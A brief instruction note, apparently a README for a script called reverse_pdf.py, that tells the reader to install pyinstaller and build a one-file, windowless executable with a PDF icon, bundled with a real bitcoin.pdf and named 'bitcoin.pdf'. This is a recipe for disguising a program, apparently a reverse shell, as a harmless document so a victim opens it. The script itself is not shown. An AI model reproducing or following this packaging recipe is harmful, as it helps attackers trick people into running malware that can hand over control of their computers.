Howdy!

the code is almot done, but you need to install pyinstaller:
pipinstall pyinstaller

in the shell to create the bitcoin.pdf use this command line:
pyinstaller --onefile --noconsole --icon=pdf.ico --add-data "bitcoin.pdf;." --name bitcoin.pdf reverse_pdf.py
